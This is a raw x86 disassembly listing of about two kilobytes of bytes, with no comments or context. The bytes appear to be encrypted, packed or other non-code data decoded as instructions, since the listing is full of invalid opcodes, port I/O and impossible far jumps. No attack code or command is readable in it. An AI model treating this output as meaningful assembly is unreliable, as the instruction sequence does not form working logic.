  407555:	sub    DWORD PTR [edi+0x28],ecx
  407558:	in     al,0xd3
  40755a:	adc    ah,BYTE PTR [ebx]
  40755c:	or     al,0x4a
  40755e:	cld    
  40755f:	and    eax,0x22d6f844
  407564:	sar    ch,1
  407566:	js     0x4075d7
  407568:	sbb    al,0x4b
  40756a:	xchg   ebp,eax
  40756b:	mov    edx,0xfbaddaaf
  407570:	or     dh,al
  407572:	call   0x6727c82e
  407577:	stc    
  407578:	aaa    
  407579:	push   es
  40757a:	pop    ss
  40757b:	cli    
  40757c:	adc    ah,0xfe
  40757f:	inc    esi
  407580:	jge    0x407564
  407582:	mov    WORD PTR [esi-0x10],?
  407585:	stos   DWORD PTR es:[edi],eax
  407586:	ret    
  407587:	sub    BYTE PTR [ecx],bh
  407589:	sti    
  40758a:	push   ss
  40758b:	in     eax,0x98
  40758d:	int3   
  40758e:	imul   ebx,DWORD PTR [eax+0x39],0xb3ecc797
  407595:	and    ecx,edx
  407597:	ins    DWORD PTR es:[edi],dx
  407598:	dec    edi
  407599:	enter  0x617c,0xce
  40759d:	adc    eax,0xf62e6aba
  4075a2:	mov    ch,0x82
  4075a4:	xchg   ebx,eax
  4075a5:	dec    ecx
  4075a6:	sbb    ebx,0xc0f1f74d
  4075ac:	mov    ebp,0x9ab1f0
  4075b1:	scas   al,BYTE PTR es:[edi]
  4075b2:	xchg   esp,eax
  4075b3:	pop    es
  4075b4:	call   0x5ec36cdd
  4075b9:	and    BYTE PTR [ebp-0x13ce7baa],0x27
  4075c0:	in     al,dx
  4075c1:	dec    ebp
  4075c2:	xor    ah,bh
  4075c4:	jmp    0xd76c8edc
  4075c9:	cmp    bh,dl
  4075cb:	sbb    dh,0x41
  4075ce:	adc    al,0x7
  4075d0:	dec    eax
  4075d1:	in     al,0xed
  4075d3:	outs   dx,BYTE PTR ds:[esi]
  4075d4:	and    ebx,DWORD PTR [edx-0x6c5e7d7]
  4075da:	mov    esi,0x39077164
  4075df:	imul   edi,DWORD PTR [eax+0x62],0x10
  4075e3:	xchg   edx,eax
  4075e4:	sahf   
  4075e5:	stos   DWORD PTR es:[edi],eax
  4075e6:	push   ss
  4075e7:	cmp    eax,0x6280010e
  4075ec:	mov    edi,edx
  4075ee:	ins    BYTE PTR es:[edi],dx
  4075ef:	iret   
  4075f0:	les    eax,FWORD PTR [ebx-0x6f]
  4075f3:	jnp    0x4075de
  4075f5:	push   ebx
  4075f6:	mov    gs,WORD PTR [esi+0x3b75040a]
  4075fc:	lahf   
  4075fd:	ins    BYTE PTR es:[edi],dx
  4075fe:	test   bl,0x4a
  407601:	mov    ds:0x7a18920c,al
  407606:	repnz retf 
  407608:	adc    DWORD PTR [edx-0x17],ebx
  40760b:	out    0x42,al
  40760d:	sbb    eax,0x48d0f8af
  407612:	fistp  DWORD PTR [esi]
  407614:	adc    eax,DWORD PTR [ebp-0x6b]
  407617:	push   cs
  407618:	dec    esi
  407619:	rcl    ebp,cl
  40761b:	xlat   BYTE PTR ds:[ebx]
  40761c:	pop    esp
  40761d:	and    DWORD PTR [edx],ecx
  40761f:	mov    cl,0xdf
  407621:	aam    0x32
  407623:	xchg   eax,ebp
  407625:	gs aad 0xb6
  407628:	jecxz  0x4075cd
  40762a:	jp     0x407665
  40762c:	jo     0x4075d2
  40762e:	xchg   ebp,eax
  40762f:	gs push edx
  407631:	(bad)  
  407632:	aaa    
  407633:	arpl   WORD PTR [ecx],bp
  407635:	aad    0xa5
  407637:	mov    al,ds:0x869a128f
  40763c:	jp     0x40767f
  40763e:	dec    eax
  40763f:	fld    QWORD PTR [ebp+ebx*2+0x4ed95579]
  407646:	and    al,0x3c
  407648:	jae    0x4076a7
  40764a:	inc    edx
  40764b:	add    eax,0xc8a481d6
  407650:	dec    edi
  407651:	mov    al,ds:0x6410b7f9
  407656:	mov    al,0x82
  407658:	stos   BYTE PTR es:[edi],al
  407659:	dec    esp
  40765a:	pushf  
  40765b:	xchg   edi,eax
  40765c:	pop    eax
  40765d:	jge    0x4076d1
  40765f:	jo     0x40767f
  407661:	push   0x1e678712
  407666:	jmp    0x2d08cb5a
  40766b:	sbb    cl,BYTE PTR [ebp+0x695b362a]
  407671:	inc    edi
  407672:	mov    bl,0xf4
  407674:	je     0x4076bf
  407676:	cmp    ebp,ecx
  407678:	jnp    0x407635
  40767a:	pop    edi
  40767b:	dec    ebx
  40767c:	daa    
  40767d:	pushf  
  40767e:	shl    DWORD PTR [esi+0x3258e429],1
  407684:	push   edi
  407685:	jg     0x4076ed
  407687:	repnz pop edx
  407689:	or     edi,edx
  40768b:	in     eax,dx
  40768c:	push   cs
  40768d:	out    0x71,eax
  40768f:	jle    0x4076c7
  407691:	xor    al,0xb6
  407693:	jns    0x407693
  407695:	addr16 mov ds:0x8e1f,al
  407699:	fidivr DWORD PTR [edx-0x1e]
  40769c:	inc    eax
  40769d:	je     0x407678
  40769f:	(bad)  
  4076a0:	mov    al,BYTE PTR [ebp+0x21]
  4076a3:	add    edx,ebx
  4076a5:	fidiv  DWORD PTR [ecx]
  4076a7:	jns    0x40764b
  4076a9:	sti    
  4076aa:	(bad)  
  4076ab:	(bad)  
  4076ac:	andnps xmm0,XMMWORD PTR [edi-0x56a90f3d]
  4076b3:	and    eax,0xa1425a36
  4076b8:	mov    eax,ds:0xde8bcf14
  4076bd:	jne    0x407719
  4076bf:	popf   
  4076c0:	sbb    al,0x64
  4076c2:	ret    
  4076c3:	mov    edx,0xa017199a
  4076c8:	jmp    0x7cec:0x547bde00
  4076cf:	test   eax,0x6acf32d3
  4076d4:	xchg   DWORD PTR [edi],ebp
  4076d6:	jae    0x4076a0
  4076d8:	pusha  
  4076d9:	cmp    ecx,ecx
  4076db:	mov    ebp,0x6713df1
  4076e0:	retf   
  4076e1:	dec    edx
  4076e2:	mov    bh,0xc7
  4076e4:	std    
  4076e5:	ds imul edi,DWORD PTR cs:[ebp-0x5a],0x10c168db
  4076ee:	fnstsw WORD PTR [ebx]
  4076f0:	push   cs
  4076f1:	fbld   TBYTE PTR [esi+0x37850b0b]
  4076f7:	mov    dl,0xe7
  4076f9:	popf   
  4076fa:	push   ss
  4076fb:	mov    edx,ebx
  4076fd:	dec    edx
  4076fe:	jp     0x407752
  407700:	inc    ebp
  407701:	sbb    esi,edx
  407703:	outs   dx,BYTE PTR ds:[esi]
  407704:	out    0x17,eax
  407706:	dec    edi
  407707:	mov    ebx,0x905cf6ed
  40770c:	cmp    BYTE PTR [edx+0x76],cl
  40770f:	call   0xc31a:0xd18ff4d5
  407716:	in     eax,0x52
  407718:	pop    edi
  407719:	bound  ebx,QWORD PTR [ecx]
  40771b:	jns    0x407731
  40771d:	mov    eax,0xa24bc61c
  407722:	in     al,0x0
  407724:	jmp    0x5a894ea3
  407729:	push   ds
  40772a:	mov    esi,0xd089e605
  40772f:	cwde   
  407730:	(bad)  
  407731:	xchg   ebp,eax
  407732:	push   edi
  407733:	aas    
  407734:	adc    eax,ebp
  407736:	fsubr  st(1),st
  407738:	adc    bl,BYTE PTR [ebp+0x2c3fb4f4]
  40773e:	ins    DWORD PTR es:[edi],dx
  40773f:	and    al,0x12
  407741:	xchg   ebp,eax
  407742:	xchg   esi,eax
  407743:	in     al,0xa5
  407745:	in     eax,dx
  407746:	dec    ecx
  407747:	clc    
  407748:	add    DWORD PTR [ebx+eax*2-0x67],0x4350fa20
  407750:	inc    ecx
  407751:	gs out 0x89,eax
  407754:	bnd jns 0x4077ae
  407757:	pushf  
  407758:	mov    ebx,0xa878ebe2
  40775d:	sbb    DWORD PTR [eax-0x79],ebx
  407760:	sbb    BYTE PTR [esi+edi*8+0x27097587],dl
  407767:	cld    
  407768:	into   
  407769:	daa    
  40776a:	dec    ebx
  40776b:	xchg   edx,eax
  40776c:	shl    BYTE PTR [esi+esi*1+0x6b],cl
  407770:	jle    0x407740
  407772:	cmp    esp,ebp
  407774:	xor    DWORD PTR [edx],edi
  407776:	mov    esi,0x7700711c
  40777b:	dec    eax
  40777c:	rcl    dh,1
  40777e:	cld    
  40777f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407780:	rcr    BYTE PTR [edx-0x19],1
  407783:	or     cl,bh
  407785:	mov    dl,bl
  407787:	mov    ebp,fs
  407789:	test   eax,0xf9cff602
  40778e:	and    DWORD PTR fs:[edx],0x624df2da
  407795:	sub    dl,BYTE PTR [esi-0x1785eb27]
  40779b:	dec    edx
  40779c:	(bad)  
  40779d:	xchg   edi,eax
  40779e:	add    eax,0xa99d15f5
  4077a3:	leave  
  4077a4:	mov    ds:0xafde6ca8,al
  4077a9:	dec    ecx
  4077aa:	sbb    bl,BYTE PTR [eax-0x123f6bcb]
  4077b0:	sbb    ebx,ebx
  4077b2:	ficom  DWORD PTR [edx+0x67490059]
  4077b8:	mov    esi,0xfd639093
  4077bd:	or     eax,DWORD PTR [ebx-0x251fbb1]
  4077c3:	lahf   
  4077c4:	(bad)  
  4077c5:	into   
  4077c6:	push   0x3926fea2
  4077cb:	inc    eax
  4077cd:	je     0x4077d5
  4077cf:	inc    ecx
  4077d0:	or     bl,cl
  4077d2:	sub    ah,ch
  4077d4:	outs   dx,DWORD PTR ds:[esi]
  4077d5:	pop    ds
  4077d6:	enter  0xeb68,0x5f
  4077da:	inc    ecx
  4077db:	cmp    dh,BYTE PTR ds:0xc843468d
  4077e1:	jmp    0xfc16:0xf15ef7f
  4077e8:	pop    esp
  4077e9:	(bad)  
  4077ea:	mov    ds:0xb015de89,eax
  4077ef:	jne    0x40780f
  4077f1:	push   edx
  4077f2:	mov    WORD PTR [eax],fs
  4077f4:	pop    edx
  4077f5:	sbb    BYTE PTR [ebp+0x66fea042],al
  4077fb:	out    dx,eax
  4077fc:	xor    eax,0x2b10d14c
  407801:	dec    eax
  407802:	or     esp,ecx
  407804:	mov    esp,0xb2863eb4
  407809:	or     esi,DWORD PTR [ebx-0x148a86c7]
  40780f:	sar    BYTE PTR [edx+0x204c8e8],1
  407815:	imul   ecx,eax,0xffffffee
  407818:	in     eax,0x2f
  40781a:	pop    edi
  40781b:	push   eax
  40781c:	pusha  
  40781d:	call   0xfbfa:0x1bf724
  407824:	in     eax,0xb4
  407826:	das    
  407827:	push   ds
  407828:	or     ecx,esp
  40782a:	test   BYTE PTR [esi],dh
  40782c:	cmp    ecx,DWORD PTR [edi]
  40782e:	test   eax,0x9fa2c4fa
  407833:	call   0xd7df363a
  407838:	out    dx,eax
  407839:	in     al,0x67
  40783b:	mov    ecx,0xaedba64f
  407840:	loopne 0x40789a
  407842:	sar    DWORD PTR [ebx],1
  407844:	stc    
  407845:	pop    es
  407846:	in     eax,dx
  407847:	outs   dx,BYTE PTR ds:[esi]
  407848:	sbb    BYTE PTR [esi],bh
  40784a:	retf   0xc884
  40784d:	jecxz  0x4077f7
  40784f:	mov    bl,0xb1
  407851:	int3   
  407852:	adc    bl,BYTE PTR [esi]
  407854:	fist   WORD PTR [ebp+0x67a300e5]
  40785a:	dec    eax
  40785b:	aam    0xa4
  40785d:	lahf   
  40785e:	neg    DWORD PTR [esi+0xd78a0a]
  407864:	or     DWORD PTR [edx+0x5f],eax
  407867:	pop    ebp
  407868:	xchg   ebx,eax
  407869:	enter  0xe9e7,0xe0
  40786d:	rol    DWORD PTR [esp+ecx*2+0x8],1
  407871:	adc    al,0xd5
  407873:	into   
  407874:	pop    ds
  407875:	jl     0x4078ab
  407877:	fs sbb dh,ch
  40787a:	lahf   
  40787b:	sbb    DWORD PTR [esi-0x2c519b03],0xffffffcf
  407882:	mov    ecx,0xe99518fb
  407887:	daa    
  407888:	addr16 adc eax,0x6a40815c
  40788e:	or     al,0x1c
  407890:	sub    eax,0xe4fc1756
  407895:	nop
  407896:	popw   es
  407898:	sar    cl,0xe3
  40789b:	ins    DWORD PTR es:[edi],dx
  40789c:	jmp    0x407880
  40789e:	sub    bh,BYTE PTR ds:0xa56970e9
  4078a4:	shr    DWORD PTR [esi+edi*1],0x5
  4078a8:	rol    DWORD PTR [ecx+0x78777105],1
  4078ae:	dec    eax
  4078af:	and    eax,0x1f0faa00
  4078b4:	add    al,BYTE PTR ds:0x3dd591c8
  4078ba:	sub    al,0x40
  4078bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078be:	loopne 0x407877
  4078c0:	retf   
  4078c1:	pop    ecx
  4078c2:	pop    esi
  4078c3:	(bad)  
  4078c4:	std    
  4078c5:	push   ebx
  4078c6:	scas   eax,DWORD PTR es:[edi]
  4078c7:	scas   eax,DWORD PTR es:[edi]
  4078c8:	or     eax,0xf045333
  4078cd:	pop    esi
  4078ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078cf:	lahf   
  4078d0:	sub    al,0x86
  4078d2:	js     0x407940
  4078d4:	dec    edx
  4078d5:	shl    DWORD PTR [esi+0x4dd205b0],0x6b
  4078dc:	mov    al,0xe5
  4078de:	xchg   ebp,eax
  4078df:	xor    BYTE PTR [ebx+0x4cd0abd9],ch
  4078e5:	dec    ebx
  4078e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078e7:	push   edx
  4078e8:	inc    BYTE PTR [esi-0x7d3b521a]
  4078ee:	aam    0x27
  4078f0:	in     al,dx
  4078f1:	scas   eax,DWORD PTR es:[edi]
  4078f2:	mov    ds:0xe9a90d9,al
  4078f7:	into   
  4078f8:	sahf   
  4078f9:	mov    ecx,0xdea0d762
  4078fe:	lods   al,BYTE PTR ds:[esi]
  4078ff:	mov    WORD PTR [ebx-0x23],es
  407902:	out    dx,eax
  407903:	sar    DWORD PTR [ebx-0x7cc99de2],0x96
  40790a:	mov    esi,0xa4187102
  40790f:	or     al,0xd0
  407911:	popa   
  407912:	mov    ecx,0xa7acc0e8
  407917:	in     eax,0xfc
  407919:	add    al,dl
  40791b:	fcmove st,st(7)
  40791d:	inc    ecx
  40791e:	dec    edi
  40791f:	push   esi
  407920:	xor    al,0xe5
  407922:	mov    DWORD PTR [eax],ecx
  407924:	out    0xd,eax
  407926:	and    eax,esp
  407928:	pop    ecx
  407929:	call   0xa07a4292
  40792e:	mov    esp,0x763d93bc
  407933:	mov    esp,DWORD PTR [ebp-0x559cd611]
  407939:	outs   dx,BYTE PTR ds:[esi]
  40793a:	push   ecx
  40793b:	mov    BYTE PTR [esi-0x7bf1c769],cl
  407941:	add    bl,0x2e
  407944:	cmp    al,0x64
  407946:	mov    bl,0x52
  407948:	jle    0x4079b5
  40794a:	pop    es
  40794b:	iret   
  40794c:	stc    
  40794d:	xchg   esp,eax
  40794e:	shl    DWORD PTR [ebp-0x2dd08e8e],1
  407954:	(bad)  [edi+0x3]
  407957:	push   ecx
  407958:	fnstsw WORD PTR [ecx]
  40795a:	and    al,BYTE PTR [edx-0x5e]
  40795d:	cmp    DWORD PTR [eax+0x6793b0dd],ebp
  407963:	jle    0x4078ed
  407965:	jmp    0x83fbd7d0
  40796a:	ins    DWORD PTR es:[edi],dx
  40796b:	jnp    0x4078f7
  40796d:	in     eax,dx
  40796e:	loope  0x40793b
  407970:	push   edi
  407971:	xor    BYTE PTR [edx-0x31399e17],0x1d
  407978:	jecxz  0x4079d5
  40797a:	fmul   DWORD PTR [esi-0x4]
  40797d:	fidivr DWORD PTR [edi]
  40797f:	in     eax,0x9
  407981:	xor    al,0x8e
  407983:	pop    ecx
  407984:	dec    esp
  407985:	mov    eax,ds:0x5fffa083
  40798a:	cmp    cl,BYTE PTR [eax-0x22]
  40798d:	or     DWORD PTR [ebp+0x55],ecx
  407990:	out    dx,al
  407991:	out    dx,eax
  407992:	push   ebp
  407993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407994:	sub    al,0xf7
  407996:	and    ebp,DWORD PTR [edx+ebx*1-0x1d32b266]
  40799d:	push   ebp
  40799e:	pop    ebp
  40799f:	lock shl DWORD PTR fs:[edx-0x30],cl
  4079a4:	sahf   
  4079a5:	jo     0x4079ef
  4079a7:	push   ds
  4079a8:	inc    esi
  4079a9:	fldcw  WORD PTR [edx+eiz*1+0x2282e3ec]
  4079b0:	jne    0x407a2b
  4079b2:	sbb    ebp,DWORD PTR [eax+0x7d]
  4079b5:	scas   eax,DWORD PTR es:[edi]
  4079b6:	mov    dh,0x10
  4079b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079b9:	ret    
  4079ba:	push   edi
  4079bb:	neg    bh
  4079bd:	pop    ecx
  4079be:	adc    eax,0x11f23868
  4079c3:	push   esp
  4079c4:	loop   0x407990
  4079c6:	ins    DWORD PTR es:[edi],dx
  4079c7:	cld    
  4079c8:	bound  ebp,QWORD PTR ds:0x95389129
  4079ce:	pop    ebx
  4079cf:	icebp  
  4079d0:	or     esi,DWORD PTR [ecx+0x6c]
  4079d3:	outs   dx,DWORD PTR ds:[esi]
  4079d4:	leave  
  4079d5:	clc    
  4079d6:	sti    
  4079d7:	adc    BYTE PTR [edi],dl
  4079d9:	pop    esp
  4079da:	ins    DWORD PTR es:[edi],dx
  4079db:	cmp    ebp,DWORD PTR [eax]
  4079dd:	pop    edi
  4079de:	push   ebp
  4079df:	arpl   WORD PTR [ebx-0x32],sp
  4079e2:	xor    al,0x11
  4079e4:	imul   ebx,DWORD PTR [edx],0xffffff8c
  4079e7:	leave  
  4079e8:	dec    edi
  4079e9:	lahf   
  4079ea:	sti    
  4079eb:	cs pop es
  4079ed:	cli    
  4079ee:	fisttp QWORD PTR [edi-0x60c56771]
  4079f4:	mov    ds:0x24db895f,eax
  4079f9:	ja     0x407a4d
  4079fb:	lea    esp,[edi+ebx*2-0x59]
  4079ff:	retf   
  407a00:	out    dx,al
  407a01:	fstp   QWORD PTR [edi+0x13707b45]
  407a07:	call   0x5474a1dd
  407a0c:	ror    DWORD PTR [edx],cl
  407a0e:	and    ecx,DWORD PTR [ecx-0x6]
  407a11:	add    DWORD PTR [ecx+0x6bc4a06e],0x51f3e186
  407a1b:	or     bh,BYTE PTR [ebx+0x5e]
  407a1e:	pop    ds
  407a1f:	out    0x8f,eax
  407a21:	cld    
  407a22:	jecxz  0x4079c3
  407a24:	jmp    0x4079a6
  407a26:	mov    es,WORD PTR [ebx]
  407a28:	mov    eax,0x94eabf1f
  407a2d:	call   FWORD PTR [esi+0x5a]
  407a30:	ret    0x37c4
  407a33:	dec    edx
  407a34:	fadd   DWORD PTR [edx-0x44]
  407a37:	add    BYTE PTR [esi],cl
  407a39:	loopne 0x407a10
  407a3b:	hlt    
  407a3c:	xchg   edx,eax
  407a3d:	and    ecx,ebx
  407a3f:	std    
  407a40:	repz fwait
  407a42:	jo     0x4079cf
  407a44:	ins    BYTE PTR es:[edi],dx
  407a45:	mov    BYTE PTR [esi+0x4d],dl
  407a48:	stos   DWORD PTR es:[edi],eax
  407a49:	stc    
  407a4a:	into   
  407a4b:	push   ecx
  407a4c:	fwait
  407a4d:	pop    ss
  407a4e:	and    esp,edi
  407a50:	sbb    BYTE PTR ds:0x3cadbbd4,0xd3
  407a57:	jnp    0x407a21
  407a59:	sahf   
  407a5a:	inc    ebx
  407a5b:	and    DWORD PTR [ebx+0x5d5a64d7],esp
  407a61:	loop   0x407a2e
  407a63:	pop    ds
  407a64:	into   
  407a65:	jnp    0x407a17
  407a67:	mov    edi,DWORD PTR [edx+ecx*8-0x66ac0cb6]
  407a6e:	or     ebx,esi
  407a70:	ss ret 0x84cf
  407a74:	cld    
  407a75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a76:	pop    ebp
  407a77:	repnz xchg esi,eax
  407a79:	jp     0x407a78
  407a7b:	sti    
  407a7c:	sbb    bh,BYTE PTR [ecx]
  407a7e:	jl     0x407ae2
  407a80:	push   edi
  407a81:	scas   al,BYTE PTR es:[edi]
  407a82:	adc    bh,bl
  407a84:	mov    edx,0xb07fee1d
  407a89:	pop    esi
  407a8a:	or     al,0x6
  407a8c:	mov    al,ss:0x22a03918
  407a92:	(bad)  
  407a95:	call   0xb986:0x5ac40c80
  407a9c:	pushf  
  407a9d:	xchg   ebp,eax
  407a9e:	push   ecx
  407a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407aa0:	jb     0x407b15
  407aa2:	add    BYTE PTR [esp+ebx*1-0x2bf3b411],ah
  407aa9:	add    al,BYTE PTR [edx+ebx*4-0x39f46302]
  407ab0:	mov    ebx,0xfabea291
  407ab5:	jne    0x407a5c
  407ab7:	xor    DWORD PTR [edx-0x92d02f1],esi
  407abd:	pusha  
  407abe:	in     al,dx
  407abf:	jmp    0x407ab3
  407ac1:	push   esi
  407ac2:	xor    esi,DWORD PTR [esp+ebx*1+0x25]
  407ac6:	clc    
  407ac7:	sbb    bl,BYTE PTR [eax]
  407ac9:	(bad)  
  407aca:	retf   0x4970
  407acd:	inc    ebx
  407ace:	mov    cl,BYTE PTR [ecx-0x5b]
  407ad1:	jmp    0xacaa:0x99b8eaae
  407ad8:	jns    0x407a66
  407ada:	lmsw   WORD PTR [ecx-0x770df662]
  407ae1:	faddp  st(5),st
  407ae3:	mov    bh,0x8d
  407ae5:	nop
  407ae6:	and    eax,eax
  407ae8:	sbb    DWORD PTR [ecx],0xffffffe0
  407aeb:	mov    bh,0x1e
  407aed:	test   DWORD PTR [eax+eiz*4-0x201786ec],0xc1662b74
  407af8:	push   ss
  407af9:	sub    edx,0xffffffd4
  407afc:	mov    dh,BYTE PTR [ebx]
  407afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407aff:	adc    eax,DWORD PTR ds:0x60b473d9
  407b05:	xchg   DWORD PTR [ebx+0x34],edi
  407b08:	retf   
  407b09:	lds    edx,FWORD PTR [eax+0x5f]
  407b0c:	xlat   BYTE PTR ds:[ebx]
  407b0d:	xchg   esi,eax
  407b0e:	aam    0xc0
  407b10:	gs sbb al,0x96
  407b13:	and    al,BYTE PTR [edx]
  407b15:	add    al,0x56
  407b17:	mov    ch,0x34
  407b19:	sub    ebx,DWORD PTR cs:[bx+0x12fb]
  407b1f:	adc    dh,BYTE PTR [ecx-0x74]
  407b22:	push   edx
  407b23:	pop    edx
  407b24:	pop    eax
  407b25:	mov    esi,0x73c60357
  407b2a:	dec    edx
  407b2b:	cwde   
  407b2c:	dec    esi
  407b2d:	mov    edx,0x6bf043fd
  407b32:	mov    al,ds:0x3223a2f1
  407b37:	hlt    
  407b38:	rcl    DWORD PTR [ecx],cl
  407b3a:	adc    dl,BYTE PTR [ebp+0x7de8cc16]
  407b40:	mov    ch,BYTE PTR [ecx+0x79fba3c6]
  407b46:	popa   
  407b47:	pop    esp
  407b48:	imul   edx,DWORD PTR [ebp-0x6b69c468],0x4c
  407b4f:	pop    esi
  407b50:	sub    BYTE PTR [ebp-0x1185aa9f],cl
  407b56:	jne    0x407b90
  407b58:	into   
  407b59:	adc    eax,0x178d412a
  407b5e:	loopne 0x407b67
  407b60:	ror    BYTE PTR [eax+0x44622cca],0xd
  407b67:	inc    esp
  407b68:	dec    DWORD PTR ss:[edi]
  407b6b:	dec    ecx
  407b6c:	cmp    DWORD PTR [edi-0x10a140db],0x83fb0830
  407b76:	add    al,0x95
  407b78:	cmovae ebx,DWORD PTR [ebx-0x44]
  407b7c:	sbb    ecx,edi
  407b7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b7f:	push   ss
  407b80:	pop    esi
  407b81:	mov    ds,WORD PTR [edi-0x1c14c0aa]
  407b87:	mov    ebp,es
  407b89:	mov    eax,0x38361fa2
  407b8e:	dec    edx
  407b8f:	std    
  407b90:	xor    DWORD PTR [ecx+0x5c169045],ebp
  407b96:	test   eax,0x426ffe5a
  407b9b:	loopne 0x407b47
  407b9d:	pushf  
  407b9e:	ror    DWORD PTR [ebx],cl
  407ba0:	push   0xffffffa3
  407ba2:	sub    eax,0x9b43c308
  407ba7:	inc    edx
  407ba8:	(bad)  
  407ba9:	loope  0x407bdd
  407bab:	push   ss
  407bac:	inc    ebx
  407bad:	add    DWORD PTR [esi-0x13],0xb14bd2b7
  407bb4:	inc    edx
  407bb5:	xor    ebx,0xffffff98
  407bb8:	xchg   edx,eax
  407bb9:	xor    dl,BYTE PTR [esp+edx*1+0x7ced295c]
  407bc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bc1:	test   eax,0xe96ee724
  407bc6:	test   al,0x9a
  407bc8:	adc    ah,BYTE PTR [edx-0x6b]
  407bcb:	and    cl,bh
  407bcd:	xchg   ebp,eax
  407bce:	dec    eax
  407bcf:	push   ds
  407bd0:	add    DWORD PTR [ecx],edx
  407bd2:	mov    ds:0x36eae45f,eax
  407bd7:	mov    bl,0x99
  407bd9:	cdq    
  407bda:	xchg   esi,eax
  407bdb:	add    bh,BYTE PTR [ecx+eiz*4-0x16fc303c]
  407be2:	dec    esi
  407be3:	in     eax,dx
  407be4:	int3   
  407be5:	dec    ecx
  407be6:	sti    
  407be7:	xor    eax,0x973241c4
  407bec:	dec    esi
  407bed:	pop    ss
  407bee:	mov    dh,0x6f
  407bf0:	pop    edi
  407bf1:	(bad)  
  407bf2:	jecxz  0x407bdc
  407bf4:	(bad)  
  407bf5:	mov    ebp,DWORD PTR [eax-0x55]
  407bf8:	jb     0x407bff
  407bfa:	in     eax,0x25
  407bfc:	add    DWORD PTR [esi+eiz*1],0xf98fb667
  407c03:	jle    0x407c02
  407c05:	dec    eax
  407c06:	adc    al,0x71
  407c08:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  407c0a:	imul   ecx,DWORD PTR [eax+0xf],0x8c09ae39
  407c11:	arpl   WORD PTR [esi-0x58c5e257],ax
  407c17:	xor    BYTE PTR [eax],cl
  407c19:	mov    bl,0x74
  407c1b:	dec    edi
  407c1c:	pop    es
  407c1d:	aam    0xb7
  407c1f:	(bad)  
  407c20:	(bad)  
  407c21:	pop    edi
  407c22:	fdivr  DWORD PTR [ecx-0x66dde2b3]
  407c28:	js     0x407c6f
  407c2a:	lea    ebp,[edi-0x63]
  407c2d:	das    
  407c2e:	pop    esp
  407c2f:	sbb    al,0xa9
  407c31:	scas   eax,DWORD PTR es:[edi]
  407c32:	fwait
  407c33:	and    BYTE PTR [esi-0x6b3ec29],bl
  407c39:	pop    ds
  407c3a:	xchg   ebp,eax
  407c3b:	sub    al,0x93
  407c3d:	daa    
  407c3e:	popa   
  407c3f:	in     eax,dx
  407c40:	mov    ah,0x91
  407c42:	shl    BYTE PTR [esi-0x14],1
  407c45:	jnp    0x407ca9
  407c47:	loop   0x407be9
  407c49:	clc    
  407c4a:	outs   dx,BYTE PTR ds:[esi]
  407c4b:	es push 0x879a5056
  407c51:	cs lahf 
  407c53:	dec    eax
  407c54:	pop    ebx
  407c55:	out    dx,eax
  407c56:	in     eax,dx
  407c57:	mov    dl,0x40
  407c59:	push   ecx
  407c5a:	inc    edi
  407c5b:	stos   DWORD PTR es:[edi],eax
  407c5c:	in     eax,0x93
  407c5e:	dec    edi
  407c5f:	mov    bl,BYTE PTR [ecx-0x53]
  407c62:	jnp    0x407c93
  407c64:	and    DWORD PTR [edx],esp
  407c66:	pop    ss
  407c67:	pop    ebp
  407c68:	int3   
  407c69:	inc    eax
  407c6a:	cmp    BYTE PTR [edx-0x2b6d6672],0x91
  407c71:	lahf   
  407c72:	aaa    
  407c73:	(bad)  
  407c74:	dec    ecx
  407c75:	xlat   BYTE PTR ds:[ebx]
  407c76:	adc    dh,BYTE PTR [eax]
  407c78:	sbb    eax,0x5a2c1699
  407c7d:	ss call 0xac48dcf4
  407c83:	int    0x51
  407c85:	xchg   ebx,eax
  407c86:	fisub  DWORD PTR ds:0x8438fa07
  407c8c:	sbb    ebx,DWORD PTR [edx]
  407c8e:	leave  
  407c8f:	sti    
  407c90:	sub    ah,BYTE PTR [ebp+0x66235452]
  407c96:	sbb    al,0x7b
  407c98:	inc    BYTE PTR ds:0xe66752f4
  407c9e:	and    ch,cl
  407ca0:	imul   DWORD PTR [ebp+0x6f7a2ab]
  407ca6:	lods   al,BYTE PTR ds:[esi]
  407ca7:	pop    DWORD PTR [edx+0x76898325]
  407cad:	cmp    al,0x4a
  407caf:	int    0x9f
  407cb1:	scas   al,BYTE PTR es:[edi]
  407cb2:	xchg   ebp,eax
  407cb3:	and    DWORD PTR [eax-0x680a5cfb],edx
  407cb9:	popf   
  407cba:	ins    BYTE PTR es:[edi],dx
  407cbb:	dec    DWORD PTR [ebx-0x58]
  407cbe:	sbb    al,BYTE PTR [ebp-0x2d]
  407cc1:	jl     0x407c70
  407cc3:	xor    eax,0x9dd53ba6
  407cc8:	xchg   DWORD PTR [ecx-0x7e0c6002],edi
  407cce:	mov    ebp,edx
  407cd0:	pop    esp
  407cd1:	imul   edx,edi,0x17
  407cd4:	out    0x32,al
  407cd6:	and    BYTE PTR [esi+0x6c],ch
  407cd9:	imul   ebx,DWORD PTR [ecx],0xa79f944a
  407cdf:	int    0xde
  407ce1:	std    
  407ce2:	mov    ebp,0xe8ad1698
  407ce7:	adc    esi,ebp
  407ce9:	and    esi,DWORD PTR [esi-0x7e]
  407cec:	mov    esp,0x55224155
  407cf1:	add    al,0x52
  407cf3:	push   edx
  407cf4:	mov    ch,0xfc
  407cf6:	pushf  
  407cf7:	in     eax,dx
  407cf8:	adc    eax,esi
  407cfa:	jl     0x407ce7
  407cfc:	cmp    DWORD PTR [esi+0x4e057cfc],eax
  407d02:	cs loopne 0x407ca5
  407d05:	dec    edx
  407d06:	mov    edx,0xd1d79f41
  407d0b:	cdq    
  407d0c:	popf   
  407d0d:	jl     0x407d0a
  407d0f:	mov    esi,0x781b3900
  407d14:	dec    esp
  407d15:	ror    ch,0x9a
  407d18:	gs xchg ebp,eax
